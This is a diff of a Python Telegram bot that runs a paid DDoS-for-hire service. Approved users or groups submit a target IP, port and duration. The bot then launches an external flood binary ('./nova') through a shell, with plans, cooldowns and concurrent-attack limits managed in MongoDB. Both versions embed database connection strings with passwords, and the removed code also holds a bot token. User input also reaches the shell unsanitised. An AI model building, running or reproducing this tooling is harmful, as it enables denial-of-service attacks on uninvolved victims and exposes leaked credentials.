@@ -1,232 +1,215 @@
 import os
-import telebot
-import json
-import requests
-import logging
-import time
-from pymongo import MongoClient
+import subprocess
+import threading
 from datetime import datetime, timedelta
-import certifi
-import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from threading import Thread
+from telegram import Update, ParseMode
+from telegram.ext import Updater, CommandHandler, CallbackContext
+from pymongo import MongoClient
 
-loop = asyncio.get_event_loop()
-
-TOKEN = '8725614806:AAFfGkyW4F2_p3RR1yGS3bYSphmZC6GlGQo'
-MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
-FORWARD_CHANNEL_ID = -1003823937567
-CHANNEL_ID = -1003823937567
-error_channel_id = -1003823937567
-
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+# MongoDB setup
+client = MongoClient('mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb')
 db = client['zoya']
-users_collection = db.users
+users_collection = db['approved_users']
+groups_collection = db['approved_groups']  # Collection for approved groups
+attacks_collection = db['attack_history']
 
-bot = telebot.TeleBot(TOKEN)
-REQUEST_INTERVAL = 1
+admins = []
+active_attacks = {}  # Tracks active attacks per group {group_id: [list of active attacks]}
+cooldowns = {}
+cooldown_period = timedelta(minutes=5)  # Cooldown of 5 minutes after attack
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
+def is_group_approved(group_id):
+    """Check if the group is approved."""
+    group = groups_collection.find_one({"_id": group_id})
+    return group is not None
 
-running_processes = []
+def get_max_attacks(group_id):
+    """Get the maximum number of allowed concurrent attacks for the group."""
+    group = groups_collection.find_one({"_id": group_id})
+    return group.get('max_attacks', 1)  # Default max attacks is 1 if not set
 
-
-REMOTE_HOST = '4.213.71.147'  
-async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./nova {target_ip} {target_port} {duration} 60"
-    try:
-       
-        process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        running_processes.append(process)
-        stdout, stderr = await process.communicate()
-        output = stdout.decode()
-        error = stderr.decode()
-
-        if output:
-            logging.info(f"Command output: {output}")
-        if error:
-            logging.error(f"Command error: {error}")
-
-    except Exception as e:
-        logging.error(f"Failed to execute command on Codespace: {e}")
-    finally:
-        if process in running_processes:
-            running_processes.remove(process)
-
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
-
-async def run_attack_command_async(target_ip, target_port, duration):
-    await run_attack_command_on_codespace(target_ip, target_port, duration)
-
-def is_user_admin(user_id, chat_id):
-    try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
-    except:
-        return False
-
-def check_user_approval(user_id):
-    user_data = users_collection.find_one({"user_id": user_id})
-    if user_data and user_data['plan'] > 0:
-        return True
-    return False
-
-def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED CONTACT @NooobFK @Anik_x_pro *", parse_mode='Markdown')
-
-@bot.message_handler(commands=['approve', 'disapprove'])
-def approve_or_disapprove_user(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    is_admin = is_user_admin(user_id, CHANNEL_ID)
-    cmd_parts = message.text.split()
-
-    if not is_admin:
-        bot.send_message(chat_id, "*You are not authorized to use this command CONTACT @NooobFK @Anik_x_pro *", parse_mode='Markdown')
-        return
-
-    if len(cmd_parts) < 2:
-        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
-        return
-
-    action = cmd_parts[0]
-    target_user_id = int(cmd_parts[1])
-    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
-    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
-
-    if action == '/approve':
-        if plan == 1:  # Instant Plan 🧡
-            if users_collection.count_documents({"plan": 1}) >= 599:
-                bot.send_message(chat_id, "*Approval failed: ☆ɪɴsᴛᴀɴᴛ ᴘʟᴀɴ☆ limit reached (599 users).*", parse_mode='Markdown')
-                return
-        elif plan == 2:  # Instant++ Plan 💥
-            if users_collection.count_documents({"plan": 2}) >= 599:
-                bot.send_message(chat_id, "*Approval failed: ☆ɪɴsᴛᴀɴᴛ++ ᴘʟᴀɴ☆ limit reached (499 users).*", parse_mode='Markdown')
-                return
-
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*☆ᴜsᴇʀ {target_user_id} ᴀᴘᴘʀᴏᴠᴇᴅ ᴡɪᴛʜ ᴘʟᴀᴍ {plan} ғᴏʀ {days} ᴅᴀʏs.*"
-    else:  # disapprove
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*ᴜsᴇʀ {target_user_id} ᴅɪsᴀᴘᴘʀᴏᴠᴇᴅ ᴀɴᴅ ʀᴇᴠᴇʀᴛᴇᴅ ᴛᴏ ғʀᴇᴇ. *"
-
-    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
-
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    if not check_user_approval(user_id):
-        send_not_approved_message(chat_id)
-        return
-
-    try:
-        bot.send_message(chat_id, "*ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɪᴘ, ᴘᴏʀᴛ, ᴀɴᴅ ᴅᴜʀᴀᴛɪᴏᴍ (ɪɴ sᴇᴄᴏɴᴅs) sᴇᴘᴀʀᴀᴛᴇᴅ ʙʏ sᴘᴀᴄᴇs.*", parse_mode='Markdown')
-        bot.register_next_step_handler(message, process_attack_command)
-    except Exception as e:
-        logging.error(f"Error in attack command: {e}")
-
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ: ɪɴsᴛᴀɴᴛ++ ᴘʟᴀɴ target_ip target_port ᴅᴜʀᴀᴛɪᴏɴ*", parse_mode='Markdown')
-            return
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*ᴘᴏʀᴛ {target_port} ɪs ʙʟᴏᴄᴋᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ ᴀ ᴅɪғғᴇʀᴇɴᴛ ᴘᴏʀᴛ.*", parse_mode='Markdown')
-            return
-
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*✧ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 ✧\n\n✧ 𝘏𝘰𝘴𝘵: {target_ip}\n✧ 𝘗𝘰𝘳𝘵: {target_port}\n✧ 𝘛𝘪𝘮𝘦: {duration} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴*", parse_mode='Markdown')
-    except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
-
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    # Create a markup object
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-
-    # Create buttons
-    btn1 = KeyboardButton("☆ɪɴsᴛᴀɴᴛ ᴘʟᴀɴ 🥭")
-    btn2 = KeyboardButton("☆ɪɴsᴛᴀɴᴛ++ ᴘʟᴀɴ 🌋")
-    btn3 = KeyboardButton("☆ᴄᴀɴᴀʀʏ ᴅᴏᴡɴʟᴏᴀᴅ 💌")
-    btn4 = KeyboardButton("☆ᴍʏ ᴀᴄᴄᴏᴜɴᴛ ☢️")
-    btn5 = KeyboardButton("☆ʜᴇʟᴘ 🔱")
-    btn6 = KeyboardButton("☆ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ 🇮🇳")
-
-    # Add buttons to the markup
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
-
-    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
-
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    if not check_user_approval(message.from_user.id):
-        send_not_approved_message(message.chat.id)
-        return
-
-    if message.text == "☆ɪɴsᴛᴀɴᴛ ᴘʟᴀɴ 🥭":
-        bot.reply_to(message, "*Instant Plan 🥭 selected*", parse_mode='Markdown')
-    elif message.text == "☆ɪɴsᴛᴀɴᴛ++ ᴘʟᴀɴ 🌋":
-        bot.reply_to(message, "*☆ɪɴsᴛᴀɴᴛ++ ᴘʟᴀɴ 🌋 sᴇʟᴇᴄᴛᴇᴅ*", parse_mode='Markdown')
-        attack_command(message)
-    elif message.text == "☆ᴄᴀɴᴀʀʏ ᴅᴏᴡɴʟᴏᴀᴅ 💌":
-        bot.send_message(message.chat.id, "*ᴘʟᴇᴀsᴇ ᴜsᴇ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ʟɪɴᴋ ғᴏʀ ᴄᴀɴᴀʀʏ ᴅᴏᴡɴʟᴏᴀᴅ: https://t.me/teamnovasupport/2*", parse_mode='Markdown')
-    elif message.text == "☆ᴍʏ ᴀᴄᴄᴏᴜɴᴛ ☢️":
-        user_id = message.from_user.id
-        user_data = users_collection.find_one({"user_id": user_id})
-        if user_data:
-            username = message.from_user.username
-            plan = user_data.get('plan', 'N/A')
-            valid_until = user_data.get('valid_until', 'N/A')
-            current_time = datetime.now().isoformat()
-            response = (f"*✧ ᴜsᴇʀɴᴀᴍᴇ: {username}\n"
-                        f"✧ ᴘʟᴀɴ: {plan}\n"
-                        f"✧ ᴠᴀʟɪᴅɪᴛʏ: {valid_until}\n"
-                        f"✧ ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴍ: {current_time}*")
-        else:
-            response = "*ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ɴᴏᴛ ғᴏᴜɴᴅ. ᴘʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ.*"
-        bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "☆ʜᴇʟᴘ 🔱":
-        bot.reply_to(message, "*If you have any problem regarding the usage of this bot kindly contact @anik_x_pro / @noobfk*", parse_mode='Markdown')
-    elif message.text == "☆ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ 🇮🇳":
-        bot.reply_to(message, "*Admins :- @Noobfk or @Anik_x_pro*", parse_mode='Markdown')
-    else:
-        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
-
-if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
-    asyncio_thread.start()
-    logging.info("sᴛᴀʀᴛɪɴɢ ᴄᴏᴅᴇsᴘᴀᴄᴇ ᴀᴄᴛɪᴠɪᴛʏ ᴋᴇᴇᴘᴇʀ ᴀɴᴅ ᴛᴇʟᴇɢʀ ʙᴏᴛ...")
-    while True:
+def set_max_attacks(update: Update, context: CallbackContext):
+    """Admin command to set the maximum number of concurrent attacks in a group."""
+    user_id = update.effective_user.id
+    chat_id = update.message.chat_id
+    
+    if user_id in admins:
         try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            logging.error(f"An error occurred while polling: {e}")
-        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
-        time.sleep(REQUEST_INTERVAL)
+            max_attacks = int(context.args[0])
+            groups_collection.update_one(
+                {"_id": chat_id},
+                {"$set": {"max_attacks": max_attacks}},
+                upsert=True
+            )
+            update.message.reply_text(f"✅ Maximum concurrent attacks set to {max_attacks} for this group! 🚀")
+        except (IndexError, ValueError):
+            update.message.reply_text("⚠️ Usage: /maxattack <number>")
+    else:
+        update.message.reply_text("🚫 You are not authorized to set the maximum number of attacks!")
+
+def approve_group(update: Update, context: CallbackContext):
+    """Admin command to approve a group."""
+    user_id = update.effective_user.id
+    chat_id = update.message.chat_id
+    
+    if user_id in admins:
+        groups_collection.update_one(
+            {"_id": chat_id},
+            {"$set": {"approved_date": datetime.now(), "max_attacks": 1}},  # Default max attacks is 1
+            upsert=True
+        )
+        update.message.reply_text(f"✅ Group {chat_id} has been approved! 🎉")
+    else:
+        update.message.reply_text("🚫 You are not authorized to approve groups!")
+
+def disapprove_group(update: Update, context: CallbackContext):
+    """Admin command to disapprove a group."""
+    user_id = update.effective_user.id
+    chat_id = update.message.chat_id
+
+    if user_id in admins:
+        groups_collection.delete_one({"_id": chat_id})
+        update.message.reply_text(f"❌ Group {chat_id} has been disapproved.")
+    else:
+        update.message.reply_text("🚫 You are not authorized to disapprove groups!")
+
+def save_user(user_id, days):
+    expires_on = datetime.now() + timedelta(days=days)
+    users_collection.update_one(
+        {"_id": user_id},
+        {"$set": {"approved_date": datetime.now(), "expires_on": expires_on}},
+        upsert=True
+    )
+
+def is_user_approved(user_id):
+    """Check if the user is approved for personal attacks."""
+    user = users_collection.find_one({"_id": user_id})
+    return user and user['expires_on'] > datetime.now()
+
+def is_user_on_cooldown(user_id):
+    """Check if the user is on cooldown."""
+    if user_id in cooldowns:
+        cooldown_end = cooldowns[user_id]
+        if datetime.now() < cooldown_end:
+            return True, cooldown_end - datetime.now()
+    return False, None
+
+def get_active_attacks_count(chat_id):
+    """Get the number of active attacks in a group."""
+    return len(active_attacks.get(chat_id, []))  # Return length of active attacks for that group
+
+def attack(update: Update, context: CallbackContext) -> None:
+    chat_id = update.message.chat_id
+    user_id = update.effective_user.id
+    
+    # If it's a group chat, check if the group is approved
+    if update.message.chat.type in ['group', 'supergroup']:
+        if not is_group_approved(chat_id):
+            update.message.reply_text("⚠️ This command can only be used in an approved group.")
+            return
         
+        # Check if the user is a member of the group
+        try:
+            member = context.bot.get_chat_member(chat_id, user_id)
+            if member.status not in ['member', 'administrator', 'creator']:
+                update.message.reply_text("🚫 You need to be a group member to attack.")
+                return
+        except:
+            update.message.reply_text("⚠️ Could not verify your membership in the group.")
+            return
+
+        # Check the maximum number of concurrent attacks in the group
+        max_attacks = get_max_attacks(chat_id)
+        if get_active_attacks_count(chat_id) >= max_attacks:
+            update.message.reply_text(f"🚫 Maximum number of concurrent attacks ({max_attacks}) reached. Please wait for an ongoing attack to finish.")
+            return
+
+    # If it's a private chat, check if the user is approved
+    elif update.message.chat.type == 'private':
+        if not is_user_approved(user_id):
+            update.message.reply_text("🚫 You are not approved to use this command in private.")
+            return
+
+    # Check cooldown
+    on_cooldown, time_left = is_user_on_cooldown(user_id)
+    if on_cooldown:
+        minutes_left = int(time_left.total_seconds() // 60)
+        seconds_left = int(time_left.total_seconds() % 60)
+        update.message.reply_text(
+            f"⏳ You are on cooldown! Please wait {minutes_left} minutes and {seconds_left} seconds before starting another attack."
+        )
+        return
+
+    # Check if there's an active attack for this user (limit this to personal chat only)
+    if chat_id in active_attacks and user_id in [a['user_id'] for a in active_attacks[chat_id]]:
+        update.message.reply_text("⚔️ You already have an ongoing attack. Please wait for it to finish.")
+        return
+
+    try:
+        ip = context.args[0]
+        port = int(context.args[1])
+        duration = int(context.args[2])
+
+        # Check if the port is blocked
+        if port in blocked_ports:
+            update.message.reply_text(f"🚫 The port {port} is blocked and cannot be used for attacks.")
+            return
+
+        # If it's a group attack, limit the duration to 300 seconds
+        if update.message.chat.type in ['group', 'supergroup'] and duration > 300:
+            duration = 300
+            update.message.reply_text("⏳ In group chats, your attack duration is limited to 300 seconds.")
+
+        # Add this attack to the list of active attacks for the group
+        if chat_id not in active_attacks:
+            active_attacks[chat_id] = []
+
+        # Store active attack details
+        attack_data = {
+            "user_id": user_id,
+            "ip": ip,
+            "port": port,
+            "duration": duration,
+            "message_id": update.message.message_id,
+            "chat_id": update.message.chat_id
+        }
+        active_attacks[chat_id].append(attack_data)
+
+        update.message.reply_text(f"🚀 **Attack STARTED!**\n\n🌐 IP: {ip}\n🔌 PORT: {port}\n⏰ TIME: {duration} seconds", parse_mode=ParseMode.MARKDOWN)
+
+        command = f"./nova {ip} {port} {duration} 10"
+        process = subprocess.Popen(command, shell=True)
+
+        def end_attack():
+            process.kill()
+            active_attacks[chat_id].remove(attack_data)  # Remove the attack from the active list
+            update.message.reply_text(f"🏁 **Attack over!**\n\n🌐 IP: {ip}\n🔌 PORT: {port}\n⏰ TIME: {duration} seconds", parse_mode=ParseMode.MARKDOWN)
+            # Set cooldown
+            cooldowns[user_id] = datetime.now() + cooldown_period
+
+        timer = threading.Timer(duration, end_attack)
+        timer.start()
+
+    except (IndexError, ValueError):
+        update.message.reply_text("⚠️ Usage: /attack <ip> <port> <time>")
+
+def main():
+    # Initialize the updater and dispatcher with your bot token
+    updater = Updater("enter bot token", use_context=True)
+    dispatcher = updater.dispatcher
+
+    # Command handlers
+    dispatcher.add_handler(CommandHandler("attack", attack))
+    dispatcher.add_handler(CommandHandler("approve", approve_group))
+    dispatcher.add_handler(CommandHandler("disapprove", disapprove_group))
+    dispatcher.add_handler(CommandHandler("maxattack", set_max_attacks))  # Command to set max attacks
+
+    # Start polling to receive updates from Telegram
+    updater.start_polling()
+    
+    # Keep the bot running until manually stopped
+    updater.idle()
+
+if __name__ == '__main__':
+    main()
